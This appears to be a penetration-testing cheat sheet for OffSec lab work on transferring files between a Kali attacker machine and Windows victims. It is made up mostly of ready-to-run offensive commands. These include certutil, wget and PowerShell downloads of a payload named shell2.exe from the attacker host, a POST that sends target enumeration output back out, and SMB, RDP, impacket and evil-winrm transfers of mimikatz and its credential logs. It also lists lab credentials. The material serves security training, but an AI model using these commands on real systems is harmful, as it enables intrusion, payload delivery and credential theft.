---
IP_KALI: 192.168.45.200
IP_TARGET: 192.168.45.200
USER: Eric.Wallows
PASSWD: EricLikesRunning800
FILENAME: shell2.exe
OUTFILE: shell2.exe
PORT_KALI: "80"
FILEPATH: C:\Users\Administrator\winpeaseout.txt
---
Common Directories:
- ligolo-ng/ligolo-ng_agent_0.7.5_windows_amd64/agent.exe
- BloodHound-Legacy/Collectors/SharpHound.exe
- BloodHound-Legacy/Collectors/SharpHound.ps1
- mimikatz/x64/mimikatz.exe

Using wget:
- wget http://<span id="IP_KALI"/>192.168.45.200<span type="end"/>:<span id="PORT_KALI"/>80<span type="end"/>/<span id="FILENAME"/>shell2.exe<span type="end"/>

Using xfreerdp, creating shared folder:
- sudo xfreerdp +clipboard /u:<span id="USER"/>Eric.Wallows<span type="end"/> /p:<span id="PASSWD"/>EricLikesRunning800<span type="end"/> /v:<span id="IP_TARGET"/>192.168.45.200<span type="end"/> +drive:/home/kali

On PS, using iwr:
- iwr -uri http://<span id="IP_KALI"/>192.168.45.200<span type="end"/><span type="end"/><span type="end"/><span type="end"/><span type="end"/><span type="end"/>:<span id="PORT_KALI"/>80<span type="end"/>/<span id="FILENAME"/>shell2.exe<span type="end"/> -Outfile <span id="OUTFILE"/>shell2.exe<span type="end"/>
- Invoke-WebRequest -Uri "http://<span id="IP_KALI"/>192.168.45.200<span type="end"/>:<span id="PORT_KALI"/>80<span type="end"/>" -Method Post -Body (Get-Content -Path "<span id="FILEPATH"/>C:\Users\Administrator\winpeaseout.txt<span type="end"/>" -Encoding Byte) -ContentType "multipart/form-data"

On linux through ssh:
- scp <span id="FILENAME"/>shell2.exe<span type="end"/> <span id="USER"/>Eric.Wallows<span type="end"/>@<span id="IP_TARGET"/>192.168.45.200<span type="end"/>:

Window file transfer cheat sheet:
- https://infinitelogins.com/2020/09/04/windows-file-transfer-cheatsheet/

Using certutil:
- certutil.exe -urlcache -f http://<span id="IP_KALI"/>192.168.45.200<span type="end"/>:80/<span id="FILENAME"/>shell2.exe<span type="end"/> <span id="OUTFILE"/>SharpHound.ps1
<span type="end"/>

Victim to Attacker File Transfers
1) SMB: 
On Kali:
```bash
impacket-smbserver test . -smb2support  -username kourosh -password kourosh
```
On Windows:
```powershell
net use m: \\Kali_IP\test /user:kourosh kourosh
copy mimikatz.log m:\
```
2) RDP mounting shared folder:
- Using xfreerdp:
On Kali:
```bash
xfreerdp /cert-ignore /compression /auto-reconnect /u:
offsec /p:lab /v:192.168.212.250 /w:1600 /h:800 /drive:test,/home/kali/Documents/pen-
200
```
On windows:
```powershell
copy mimikatz.log \\tsclient\test\mimikatz.log
```
- Using rdesktop:
On Kali: 
```bash
rdesktop -z -P -x m -u offsec -p lab 192.168.212.250 -r disk:test=/home/kali/Documents/pen-200
```
On Windows:
```powershell
copy mimikatz.log \\tsclient\test\mimikatz.log
```
1) Impacket tools:
psexec and wmiexec are shipped with built in feature for file transfer.
**Note**: By default whether you upload (lput) or download (lget) a file, it'll be writte in `C:\Windows` path.
Uploading mimikatz.exe to the target machine:
```bash
C:\Windows\system32> lput mimikatz.exe
[*] Uploading mimikatz.exe to ADMIN$\/
C:\Windows\system32> cd C:\windows
C:\Windows> dir /b mimikatz.exe
mimikatz.exe
```
Downloading mimikatz.log:
```bash
C:\Windows> lget mimikatz.log
[*] Downloading ADMIN$\mimikatz.log
```
2) Evil-winrm:
- Uploading files:
```bash
upload mimikatz.exe C:\windows\tasks\mimikatz.exe
```
- Downloading files:
```bash
download mimikatz.log /home/kali/Documents/pen-200
```
3) C2 frameworks:
Almost any of the C2 frameworks such as Metasploit are shipped with downloading and uploading functionality.

4) In FTP, binaries in ASCII mode will make the file not executable. Set the mode to binary.

Additional Resources:
File Transfer:  https://www.youtube.com/watch?v=kd0sZWI6Blc
PEN-100: https://portal.offsec.com/learning-paths/network-penetration-testing-essentials-pen-100/books-and-videos/modal/modules/file-transfers

Happy hacking!